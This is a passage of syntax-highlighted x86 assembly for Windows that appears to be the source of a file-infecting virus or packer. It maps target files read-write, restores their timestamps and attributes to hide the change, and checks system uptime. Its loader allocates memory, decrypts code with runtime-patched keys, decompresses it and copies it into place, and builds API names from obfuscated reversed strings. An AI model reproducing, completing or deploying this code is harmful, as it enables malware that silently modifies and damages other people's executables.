   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">w_IO@005</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@008</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">

   </span><span class="sc5">w_IO@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetFileAttributesA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;   FILE_SHARE_READ</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@012</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">w_IO@006</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">w_IO@007</span><span class="sc0">

   </span><span class="sc5">w_IO@006</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">

   </span><span class="sc5">w_IO@007</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CreateFileA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@001</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">w_IOB@005</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_handle@009</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetFileTime</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetFileSize</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">w_IO@004</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">w_IO@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@012</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">w_IO@008</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">w_IO@009</span><span class="sc0">

   </span><span class="sc5">w_IO@008</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">w_IO@009</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CreateFileMappingA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@003</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">w_IOB@004</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@012</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">w_IOB@010</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">w_IOB@011</span><span class="sc0">

   </span><span class="sc5">w_IOB@010</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

   </span><span class="sc5">w_IOB@011</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@003</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MapViewOfFile</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">w_IOB@003</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@012</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">w_IOB@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc5">w_IOB@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_UnmapViewOfFile</span><span class="sc0">

   </span><span class="sc5">w_IOB@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@003</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CloseHandle</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetFilePointer</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetEndOfFile</span><span class="sc0">

   </span><span class="sc5">w_IOB@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_handle@009</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetFileTime</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CloseHandle</span><span class="sc0">

   </span><span class="sc5">w_IOB@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@008</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetFileAttributesA</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@012</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">system@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetTickCount</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dia</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">system@002</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;   TRUE</span><span class="sc0">

   </span><span class="sc5">system@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">aumentar@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">SII</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">aumentar@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">aumentar@002</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">enc_by_first</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc5">.bf1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.bf1</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">_main_loader</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc1">;1-alloc memory</span><span class="sc0">
   </span><span class="sc1">;2-decrypt code</span><span class="sc0">
   </span><span class="sc1">;3-unpack code</span><span class="sc0">
   </span><span class="sc1">;4-get api's</span><span class="sc0">
   </span><span class="sc1">;5-create/execute new thread</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LLD.'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'23LE'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fx_LoadLibrary</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'col'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'lAla'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'bolG'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fx_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">9000h</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">m_handle@003</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_main_l0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc5">l2_decrypt@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">rnd_loader2_add</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">rnd_loader2_xor</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">rnd_loader2_sub</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l2_decrypt@001</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_aP_depack_asm</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00409000h</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">m_handle@005</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_main_l0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc5">l2_decrypt@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">rnd_loader2_add2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">rnd_loader2_xor2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">rnd_loader2_sub2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l2_decrypt@002</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_aP_depack_asm</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00409000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;  unpacked lenght</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">;  unpacked lenght</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc1">;  get api's</span><span class="sc0">

   </span><span class="sc5">_main_add_api</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">import</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_main_list</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_list.INC</span><span class="sc0">

